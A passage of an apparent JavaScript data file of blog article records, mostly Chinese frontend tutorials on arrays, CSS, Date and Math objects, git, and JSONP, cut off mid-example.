        "```js\n<script>\n    // 数组扁平化，去重，升序\n    // 方法1，使用es6中的flat()方法扁平化数组，然后new Set去重，最后sort排序\n    let arr = [1, 3, 2, [4, 5, 7, [6, 7, 8, [9, 1, 3]]]]\n    arr = arr.flat(Infinity)\n    arr = [...new Set(arr)]\n    // arr = Array.from(arr)\n    // arr = [...arr]\n    arr.sort((a, b) => {\n        return a - b\n    })\n    console.log(arr);\n\n    // 方法2，使用toString()方法将数组转化为字符串，再使用splice()方法,最后map()方法，扁平化数组，然后new Set去重，最后sort排序\n    let arr1 = [1, 3, 2, [4, 5, 7, [6, 7, 8, [9, 1, 3]]]]\n    arr1 = arr1.toString().split(',').map(item => {\n        return Number(item)\n    })\n    arr1 = [...new Set(arr1)]\n    // arr1 = Array.from(arr1)\n    // arr1 = [...arr1]\n    arr1.sort((a, b) => {\n        return a - b\n    })\n    console.log(arr1);\n\n    // 方法3，利用JSON.stringify，然后正则替换[]\n    let arr2 = [1, 3, 2, [4, 5, 7, [6, 7, 8, [9, 1, 3]]]]\n    arr2 = JSON.stringify(arr2).replace(/(\\[|\\])/g, '').split(',').map(item => {\n        return Number(item)\n    })\n    arr2 = [...new Set(arr2)]\n    arr2.sort((a, b) => {\n        return a - b\n    })\n    console.log(arr2);\n</script>\n```\n",
      click: 4,
      createdAt: '2020-05-07T13:56:14.000Z',
      updatedAt: '2021-02-16T13:08:32.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 15,
            article_id: 15,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 15,
            user_id: 1,
            article_id: 15,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 14,
      title: 'css绘制三角形',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "```html\n<style>\n    #test {\n        width: 0;\n        height: 0;\n        border: 25px solid transparent;\n        border-bottom: 25px solid gray;\n        border-top: 0 solid transparent;\n        ;\n    }\n</style>\n<div id='test'></div>\n```\n",
      click: 5,
      createdAt: '2020-05-07T13:53:33.000Z',
      updatedAt: '2021-02-16T13:08:14.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 14,
            article_id: 14,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 14,
            user_id: 1,
            article_id: 14,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 4,
          name: 'css',
          color: 'rgba(144, 238, 144, 1)',
          createdAt: '2020-07-04T15:17:06.000Z',
          updatedAt: '2020-07-04T15:17:06.000Z',
        },
      ],
    },
    {
      id: 24,
      title: 'find()和some()',
      is_comment: 1,
      status: 1,
      img: '/1588859022245es6.jpg',
      content:
        "# find()方法\n\nfind() 方法返回通过测试（函数内判断）的数组的**第一个元素的值。**\n\nfind() 方法为数组中的每个元素都调用一次函数执行：\n\n- 当数组中的元素在测试条件时返回 *true* 时, find() 返回符合条件的元素，之后的值不会再调用执行函数。\n- 如果没有符合条件的元素返回 **undefined**\n\n```js\n// find()\nlet arr6 = [1, 2, 3, 4, 5]\nlet res = arr6.find(val => {\n    return val > 3\n})\nconsole.log(res);   //4\nlet res1 = arr6.find(val => {\n    return val > 5\n})\nconsole.log(res1);   //undefined\nlet objarr = [{ id: 1, name: '张三' }, { id: 2, name: '李四' }, { id: 3, name: '王五' }]\nlet objarrres = objarr.find(val => {\n    return val.id > 1\n})\nconsole.log(objarrres);     //{id: 2, name: \"李四\"}\n```\n\n\n\n# some()方法\n\nsome() 方法用于检测数组中的元素是否满足指定条件（函数提供）。\n\nsome() 方法会依次执行数组的每个元素：\n\n- 如果有一个元素满足条件，则表达式返回***true*** , 剩余的元素不会再执行检测。\n- 如果没有满足条件的元素，则返回**false**。\n\n```js\n// some()\nlet arr7 = [1, 2, 3, 4, 5, 6]\nlet res2 = arr7.some(val => {\n    return val > 3\n})\nconsole.log(res2);  //true\nlet res3 = arr7.some(val => {\n    return val > 6\n})\nconsole.log(res3);  //false\n```\n\n",
      click: 2,
      createdAt: '2020-05-07T13:46:11.000Z',
      updatedAt: '2021-02-16T13:10:31.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 24,
            article_id: 24,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 24,
            user_id: 1,
            article_id: 24,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 23,
      title: 'Set和Map',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "# set结构\n类似于数组，但是成员的值都是唯一的,没有重复的值。\n\n```js\n// set结构\nlet arr = [1, 2, 3, 3, 5, 6, 4, 6]\nlet arr1 = new Set()\narr1.add(1).add(3).add(3).add(2)\nconsole.log(arr1);  //Set(3) {1, 3, 2}\nlet arr2 = new Set(arr)\nconsole.log(arr2);  //Set(6) {1, 2, 3, 5, 6, 4}\nfor (let val of arr2) {\n    console.log(val);\n}\n```\n\n\n\n# set()方法\n\n去重\n\n```js\nlet arr = [1, 2, 3, 3, 5, 6, 4, 6]\nlet arr2 = new Set(arr)\nconsole.log(arr2);  //Set(6) {1, 2, 3, 5, 6, 4}\n// 去重转数组\narr2 = [...arr2]\nconsole.log(arr2);  // [1, 2, 3, 5, 6, 4]\n```\n\n\n\n# map结构\n类似于对象，也是键值对的集合，但是对象的键只能是字符串，而Map的键可以是任意类型的值。\n\n```js\n// map结构\nlet arr3 = new Map()\narr3.set('name','掌声').set('age',18).set('sex','男')\nconsole.log(arr3);\nfor( let [key,value] of arr3){\n    console.log(key,value);\n}\n```\n\n# map()方法\n\nmap() 方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。\n\nmap() 方法按照原始数组元素顺序依次处理元素。\n\n**注意：** map() 不会对空数组进行检测。\n\n**注意：** map() 不会改变原始数组。\n\n```js\n// map()方法\nlet arr4 = [1, 2, 3, 4, 5]\narr5 = arr4.map(val => {\n    return val + 1\n})\nconsole.log(arr4);  // [1, 2, 3, 4, 5]\nconsole.log(arr5);  // [2, 3, 4, 5, 6]\n```\n",
      click: 7,
      createdAt: '2020-05-07T13:43:43.000Z',
      updatedAt: '2021-02-16T13:10:18.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 23,
            article_id: 23,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 23,
            user_id: 1,
            article_id: 23,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 21,
      title: 'Js Date对象',
      is_comment: 1,
      status: 1,
      img: '/1588781712222hero.jpg',
      content:
        "# Date对象\n\n# 基本方法\n\n> 创建Date对象：new Date()\n>\n> 返回年份：getFullYear()\n>\n> 返回月份 (0 ~ 11)：getMonth()\n>\n> 返回一个月中的某一天 (1 ~ 31)：getDate()\n>\n> 返回 Date 对象的小时 (0 ~ 23)：getHours()\n>\n> 返回 Date 对象的分钟 (0 ~ 59 )：getMinutes()\n>\n> 返回 Date 对象的秒钟 (0 ~ 59)：getSeconds()\n>\n> 返回 Date 对象的毫秒 (0 ~ 999)：getMilliseconds()\n\n```js\n<script>\n    var date1 = new Date();\n    var date2 = new Date(1590749870077);\n    var date3 = new Date('2020-5-29 18:54:10');\n    var date4 = new Date(2020, 4, 29, 18, 54, 10, 800);\n    console.log(date1);\n    console.log(date2); //Fri May 29 2020 18:57:50 GMT+0800 (中国标准时间)\n    console.log(date3); //Fri May 29 2020 18:54:10 GMT+0800 (中国标准时间)\n    console.log(date4); //Fri May 29 2020 18:54:10 GMT+0800 (中国标准时间)\n    var date5 = date4.getFullYear()\n    var date6 = date4.getMonth()\n    var date7 = date4.getDate()\n    var date8 = date4.getHours()\n    var date9 = date4.getMinutes()\n    var date10 = date4.getSeconds()\n    var date11 = date4.getMilliseconds()\n    // 2020 5 29 18 54 10 800\n    console.log(date5, date6 + 1, date7, date8, date9, date10, date11);\n</script>\n```\n\n\n\n# 常用方法\n\n## 返回 1970 年1月1日至今的毫秒数 - getTime()\n\n```js\n<script>\n    var date1 = new Date()\n    var date2 = date1.getTime()\n    console.log(date2); //1590751359793\n</script>\n```\n\n##  以毫秒设置 Date 对象 - setTime()\n\n```js\n<script>\n    var date1 = new Date('2020-5-29 14:35:10')\n    var date2 = date1.getTime()\n    console.log(date2); //1590734110000\n    date1.setTime(date2)\n    console.log(date1); //Fri May 29 2020 14:35:10 GMT+0800 (中国标准时间)\n\n    var date3 = 1 * 24 * 60 * 60 * 1000\n    date1.setTime(date2 + date3)\n    console.log(date1); //Sat May 30 2020 14:35:10 GMT+0800 (中国标准时间)\n\n    console.log(date1.toUTCString());   //Sat, 30 May 2020 06:35:10 GMT\n</script>\n```\n\n## 根据世界时，把 Date 对象转换为字符串 - toUTCString()\n\n```js\n<script>\n    var date4 = new Date()\n    console.log(date4);         //Fri May 29 2020 19:40:23 GMT+0800 (中国标准时间)\n    console.log(date4.toUTCString());   // Fri, 29 May 2020 11:40:23 GMT\n</script>\n```\n\n## new Date()\n\n```js\nvar date = new Date()   //当前时间\nconsole.log(date);\nvar date1 = new Date(2020, 4, 6)  //Wed May 06 2020 00:00:00 GMT+0800 (中国标准时间),也就是2020年5月6日0时0分0秒\nconsole.log(date1);\nvar date2 = new Date(2020, 4, 6, 10, 3, 43)  //Wed May 06 2020 10:03:43 GMT+0800 (中国标准时间),也就是2020年5月6日10时3分43秒\nconsole.log(date2);\nvar date3 = new Date('2020-5-6')    //Wed May 06 2020 00:00:00 GMT+0800 (中国标准时间),也就是2020年5月6日0时0分0秒\nconsole.log(date3);\nvar date4 = new Date('2020-5-6 10:3:43')    //Wed May 06 2020 10:03:43 GMT+0800 (中国标准时间),也就是2020年5月6日10时3分43秒\nconsole.log(date4);\n```\n\n### 获取时间戳\n\n```js\nvar date5 = new Date()\nconsole.log(date5.valueOf());\t//1590752594363\nconsole.log(date5.getTime());\t//1590752594363\nvar date6 = +new Date();\nconsole.log(date6);\t//1590752594363\n//H5新增\nconsole.log(Date.now());\t//1590752594363\n```\n\n### 时间转化为时间戳\n\n```js\nvar stamp1 = new Date('2020-5-6 10:10:10').getTime()\nconsole.log(stamp1);     //1588731010000\nvar stamp2 = new Date('2020-5-6 10:10:10').valueOf()\nconsole.log(stamp2);    //1588731010000\nvar stamp3 = +new Date('2020-5-6 10:10:10')\nconsole.log(stamp3);    //1588731010000\n```\n\n### 格式化日期：年月日星期时分秒\n\n```js\n// 格式化日期(年月日星期时分秒)\nfunction formatdate(time) {\n    var date3 = new Date(time)\n    var year = date3.getFullYear() //年\n    var month = date3.getMonth() + 1    //月\n    var day = date3.getDate()     //日\n    var weekarr = ['星期日', '星期一', '星期二', '星期三', '星期四', '星期五', '星期六']\n    var week = date3.getDay()  //星期\n    var hour = date3.getHours() //时\n    hour = hour < 10 ? '0' + hour : hour\n    var minutes = date3.getMinutes()    //分\n    minutes = minutes < 10 ? '0' + minutes : minutes\n    var seconds = date3.getSeconds()  //秒\n    seconds = seconds < 10 ? '0' + seconds : seconds\n    return year + '年' + month + '月' + day + '日' + weekarr[week] + hour + '时' + minutes + '分' + seconds + '秒'\n}\nconsole.log(formatdate('2020-5-6 1:2:1'));  //2020年5月6日星期三01时02分01秒\n```\n\n### 格式化日期：年月日时分秒\n\n```js\n// 格式化日期(年月日时分秒)\nfunction formatdate1(time) {\n    var date3 = new Date(time)\n    var year = date3.getFullYear() //年\n    var month = date3.getMonth() + 1    //月\n    var day = date3.getDate()     //日\n    var hour = date3.getHours() //时\n    hour = hour < 10 ? '0' + hour : hour\n    var minutes = date3.getMinutes()    //分\n    minutes = minutes < 10 ? '0' + minutes : minutes\n    var seconds = date3.getSeconds()  //秒\n    seconds = seconds < 10 ? '0' + seconds : seconds\n    return year + '年' + month + '月' + day + '日' + hour + '时' + minutes + '分' + seconds + '秒'\n}\nconsole.log(formatdate1('2020-5-6 1:2:1')); //2020年5月6日01时02分01秒\n```\n\n### 案例\n\n```js\n// 倒计时案例\nfunction timedown(inputime) {\n    var nowdate = +new Date()  //当前时间戳\n    var inputdate = +new Date(inputime)  //输入的时间戳\n    var resdate = parseInt((inputdate - nowdate) / 1000)  //将毫秒数转化为秒\n    var day = parseInt(resdate / (60 * 60 * 24))    //天\n    day = day < 10 ? '0' + day : day\n    var hour = parseInt(resdate / (60 * 60) % 24)   //时\n    hour = hour < 10 ? '0' + hour : hour\n    var minutes = parseInt(resdate / 60 % 60)   //分\n    minutes = minutes < 10 ? '0' + minutes : minutes\n    var seconds = parseInt(resdate % 60)    //秒\n    seconds = seconds < 10 ? '0' + seconds : seconds\n    return day + '天' + hour + '时' + minutes + '分' + seconds + '秒'\n}\nsetInterval(() => {\n    console.log(timedown('2020-5-7 19:13:59'));\n}, 1000);\n\n// 运行时案例\nfunction runtime(inputime) {\n    var nowdate = +new Date()  //当前时间戳\n    var inputdate = +new Date(inputime)  //输入的时间戳\n    var resdate = parseInt((nowdate - inputdate) / 1000)  //将毫秒数转化为秒\n    var day = parseInt(resdate / (60 * 60 * 24))    //天\n    day = day < 10 ? '0' + day : day\n    var hour = parseInt(resdate / (60 * 60) % 24)   //时\n    hour = hour < 10 ? '0' + hour : hour\n    var minutes = parseInt(resdate / 60 % 60)   //分\n    minutes = minutes < 10 ? '0' + minutes : minutes\n    var seconds = parseInt(resdate % 60)    //秒\n    seconds = seconds < 10 ? '0' + seconds : seconds\n    return day + '天' + hour + '时' + minutes + '分' + seconds + '秒'\n}\n\nsetInterval(() => {\n    console.log(runtime('2020-5-6 10:10:10'));\n}, 1000);\n```\n\n### 时间戳转正常时间\n\n```js\n// 时间戳转正常时间年月日时分秒\nfunction formatdate2(timestamp) {\n    var date = new Date(timestamp)\n    var year = date.getFullYear() //年\n    var month = date.getMonth() + 1    //月\n    var day = date.getDate()     //日\n    var hour = date.getHours() //时\n    hour = hour < 10 ? '0' + hour : hour\n    var minutes = date.getMinutes()    //分\n    minutes = minutes < 10 ? '0' + minutes : minutes\n    var seconds = date.getSeconds()  //秒\n    seconds = seconds < 10 ? '0' + seconds : seconds\n    return year + '年' + month + '月' + day + '日' + hour + '时' + minutes + '分' + seconds + '秒'\n\n}\nconsole.log(formatdate2(1588774080345));\t//2020年5月6日22时25分05秒\n```\n\n### 时间戳转化为精确到分的时间戳\n\n```js\n// 将时间戳转化为精确到分的时间戳\nfunction formatdate3(timestamp) {\n    //首先将时间戳转化为正常时间\n    var date = new Date(timestamp)  //Wed May 06 2020 22:25:05 GMT+0800 (中国标准时间)\n    // 获取秒数\n    var seconds = date.getSeconds()\n    // 原来时间戳减去秒数乘以1000,得到精确到分的时间戳\n    var newtimestamp = timestamp - (5 * 1000)\n    //将毫秒去掉精确到秒的时间戳\n    newtimestamp = Date.parse(new Date(newtimestamp))\n    return newtimestamp\n}\nconsole.log(formatdate3(1588775105149))\n```\n\n\n\n",
      click: 1,
      createdAt: '2020-05-06T16:15:14.000Z',
      updatedAt: '2021-02-16T13:09:53.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 21,
            article_id: 21,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 21,
            user_id: 1,
            article_id: 21,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 22,
      title: 'Js Math对象',
      is_comment: 1,
      status: 1,
      img: '/1588780749096Tesla1.jpg',
      content:
        '# Math对象\n\n## Math.random()\n\n得到一个大于等于0，小于1之间的随机数\n\n```js\n// 随机获取0-1之间的随机数\nconsole.log(Math.random());\n// 随机获取0-10之间的随机数[0-10)\nconsole.log(Math.random() * 10);\n// 随机获取0-9之间的随机整数[0-9]\nconsole.log(Math.floor(Math.random() * 10));\n// 随机获取0-8之间的随机整数[0-8]\nconsole.log(Math.floor(Math.random() * 9));\n// 随机获取1-9之间的随机整数[1-9]\nconsole.log(Math.floor(Math.random() * 9) + 1);\n// 随机获取1-10之间的随机整数[1-10]\nconsole.log(Math.floor(Math.random() * 10) + 1);\n// 随机获取1-20之间的随机整数[1-20]\nconsole.log(Math.floor(Math.random() * 20) + 1);\n\n//随机获取1-9之间的随机整数[1-9]\nconsole.log(Math.ceil(Math.random() * 9));\n//随机获取1-20之间的随机整数[1-20]\nconsole.log(Math.ceil(Math.random() * 20));\n//随机获取[n-m]之间的随机整数\nfunction getRandomInt(min, max) {\n    return Math.floor(Math.random() * (max - min + 1)) + min;\n}\nfunction getRandomInt1(min, max) {\n    return Math.round(Math.random() * (max - min)) + min\n}\n// Fisher–Yates shuffle洗牌算法\nfunction shuffle(arr) {\n    for (var i = arr.length - 1; i >= 0; i--) {\n        // 随机下标\n        var randomIndex = Math.floor(Math.random() * (i + 1));\n        // 随机下标的值\n        var itemAtIndex = arr[randomIndex];\n        // 随机下标的值和当前遍历到的下标的值互换位置\n        arr[randomIndex] = arr[i];\n        // 把当前遍历到的值换成随机下标的值\n        arr[i] = itemAtIndex;\n    }\n    return arr;\n}\n```\n\n## Math.round()\n\n四舍五入，该函数返回的是一个四舍五入后的的整数\n\n```js\nconsole.log(Math.round(1.4));   //1\nconsole.log(Math.round(1.5));   //2\nconsole.log(Math.round(1.6));   //2\nconsole.log(Math.round(-1.4));  //-1\nconsole.log(Math.round(-1.5));  //-1\nconsole.log(Math.round(-1.6));  //-2\n```\n\n## Math.ceil()\n\n向上取整\n\n```js\nconsole.log(Math.ceil(0.4));  //1\nconsole.log(Math.ceil(0.5));  //1\nconsole.log(Math.ceil(0.6));  //1\nconsole.log(Math.ceil(-0.4));  //-0\nconsole.log(Math.ceil(-0.5));  //-0\nconsole.log(Math.ceil(-0.6));  //-0\nconsole.log(Math.ceil(1.4));   //2\nconsole.log(Math.ceil(1.5));   //2\nconsole.log(Math.ceil(1.6));   //2\nconsole.log(Math.ceil(-1.4));  //-1\nconsole.log(Math.ceil(-1.5));  //-1\nconsole.log(Math.ceil(-1.6));  //-1\n```\n\n## Math.floor()\n\n向下取整\n\n```js\nconsole.log(Math.floor(0.4));  //0\nconsole.log(Math.floor(0.5));  //0\nconsole.log(Math.floor(0.6));  //0\nconsole.log(Math.floor(-0.4));  //-1\nconsole.log(Math.floor(-0.5));  //-1\nconsole.log(Math.floor(-0.6));  //-1\nconsole.log(Math.floor(1.4));   //1\nconsole.log(Math.floor(1.5));   //1\nconsole.log(Math.floor(1.6));   //1\nconsole.log(Math.floor(-1.4));  //-2\nconsole.log(Math.floor(-1.5));  //-2\nconsole.log(Math.floor(-1.6));  //-2\nconsole.log(Math.ceil(-1.6));  //-1\n```\n\n',
      click: 17,
      createdAt: '2020-05-06T15:59:10.000Z',
      updatedAt: '2021-02-16T13:10:02.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 22,
            article_id: 22,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 22,
            user_id: 1,
            article_id: 22,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 20,
      title: '修改.gitignore',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# 有时候需要突然修改 .gitignore 文件，随后要立即生效\n\n```language\n// 清除缓存 -r 表示递归删除（如果有文件夹的话） .表示所有文件\n$ git rm -r --cached .\ngit add .\ngit commit -m "update .gitignore"\ngit push origin master\n```\n',
      click: 4,
      createdAt: '2020-04-25T17:20:12.000Z',
      updatedAt: '2021-02-16T13:09:46.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 20,
            article_id: 20,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 20,
            user_id: 1,
            article_id: 20,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 8,
          name: 'git',
          color: 'rgba(245, 77, 39, 1)',
          createdAt: '2020-07-04T15:22:29.000Z',
          updatedAt: '2020-07-04T15:22:29.000Z',
        },
      ],
    },
    {
      id: 11,
      title: '记一次实习收获',
      is_comment: 1,
      status: 1,
      img: '/1596884120570shixi.jpg',
      content:
        '# 单词倒序\n```js\nfunction desc(str) {\n    var arr = str.split(" ")\n    var res = []\n    for (var i = 0; i < arr.length; i++) {\n        res.unshift(arr[i])\n    }\n    return res.join(" ")\n}\n\nvar str = \'hello word i come here\'\nconsole.log(desc(str))\n```\n# 去重\n```js\n        function distinct1(arr, key) {\n            var newobj = {}, newArr = [];\n            for (var i = 0; i < arr.length; i++) {\n                var item = arr[i];\n                if (!newobj[item[key]]) {\n                    newobj[item[key]] = newArr.push(item);\n                }\n            }\n            console.log(newArr)\n            return newArr;\n        }\n        var arr1 = [\n            { name: \'张三\' },\n            { name: \'张三\' },\n            { name: \'李四\' },\n            { name: \'王五\' },\n        ]\n        distinct1(arr1, \'name\')\n```\n# 分组\n```js\n        var arr1 = [\n            { "id": "1001", "name": "值1" },\n            { "id": "1001", "name": "值1" },\n            { "id": "1002", "name": "值2" },\n            { "id": "1002", "name": "值2" },\n            { "id": "1002", "name": "值2" },\n            { "id": "1003", "name": "值3" }\n        ];\n\n        function groupby(arr, groups) {\n            var map = {},\n                dest = [];\n            for (var i = 0; i < arr.length; i++) {\n                var ai = arr[i];\n                if (!map[ai.id]) {\n                    dest.push({\n                        id: ai.id,\n                        groups: [ai]\n                    });\n                    map[ai.id] = ai;\n                } else {\n                    for (var j = 0; j < dest.length; j++) {\n                        var dj = dest[j];\n                        if (dj.id == ai.id) {\n                            dj.groups.push(ai);\n                            break;\n                        }\n                    }\n                }\n            }\n            return dest\n        }\n        console.log(arr1)\n        console.log(groupby(arr1, \'id\'));\n```\n# 深拷贝\n```js\n        deepClone = (initalObj) => {\n            const obj = {};\n            if (typeof initalObj !== \'object\') {\n                return initalObj\n            }\n            for (const key in initalObj) {\n                if (typeof initalObj[key] === \'object\') {\n                    //对数组特殊处理\n                    if (Array.isArray(initalObj[key])) {\n                        //用map方法返回新数组，将数组中的元素递归\n                        obj[key] = initalObj[key].map(item => this.deepClone(item))\n                    } else {\n                        //递归返回新的对象\n                        obj[key] = this.deepClone(initalObj[key]);\n                    }\n                } else if (typeof initalObj[key] === \'function\') {\n                    //返回新函数\n                    obj[key] = initalObj[key].bind(obj);\n                } else {\n                    //基本类型直接返回\n                    obj[key] = initalObj[key];\n                }\n            }\n            return obj;\n        }\n        const obj = {\n            a: 1,\n            b: {},\n            c: { d: {}, g: () => { } },\n            e: () => { },\n            f: function () { }\n        }\n        const newObj = deepClone(obj);\n```\n',
      click: 33,
      createdAt: '2020-04-22T13:42:59.000Z',
      updatedAt: '2021-02-16T13:07:10.000Z',
      types: [
        {
          id: 3,
          name: '随记',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 11,
            article_id: 11,
            type_id: 3,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 11,
            user_id: 1,
            article_id: 11,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 9,
          name: '实习记录',
          color: 'rgba(17, 45, 173, 1)',
          createdAt: '2020-07-04T15:24:21.000Z',
          updatedAt: '2020-07-04T15:24:21.000Z',
        },
      ],
    },
    {
      id: 13,
      title: 'Jsonp原理',
      is_comment: 1,
      status: 1,
      img: '/1583837827168jsonp.png',
      content:
        "# Jsonp(JSON with Padding)\n#### *JSONP:一种非官方跨域数据交互协议*\n众所周知，由于浏览器的同源策略，要从不同的域（网站）访问数据会产生跨域问题，img的src(获取图片)，link的herf（获取css），script的scr(获取JavaScript)，这三个不属于同源策略，都可以跨域获取数据，因此，jsonp应运而生！\n\nJSONP实现跨域的原理简单的说，就是动态创建script标签，然后利用script的src 不受同源策略约束来跨域获取数据。\n\n直接上代码，前端：\n```language\n<body>\n    <button id=\"normal\">原生jsonp</button>\n    <script>\n        function show(x) {\n            console.log('下面是jsonp返回的数据')\n            console.log(x)\n        }\n        var btn = document.getElementById('normal')\n        btn.onclick = function () {\n            var parent = document.body\n            var cb = document.createElement('script');\n            cb.src = \"http://localhost:3000?callback=show\"\n            parent.appendChild(cb)\n            parent.removeChild(parent.lastElementChild)\n        }\n    </script>\n</body>\n```\n前端（jquery版）：\n```language\n<body>\n    <button id=\"ajax\">ajax jsonp</button>\n    <script>\n        $(\"#ajax\").click(function () {\n            $.ajax({\n                url: \"http://localhost:3000\",\n                dataType: 'jsonp',\n                success: function (result) {\n                    console.log('下面是jsonp返回的数据')\n                    console.log(result)\n                }\n            });\n        });\n    </script>\n</body>\n```\n\n后端（node）：\n```language\nvar express = require('express')\nvar url = require('url')\nvar app = express()\n\napp.use('/', function (req, res) {\n    var urlParse = url.parse(req.url, true)\n    var cb = urlParse.query.callback\n    res.end(cb + \"('I am 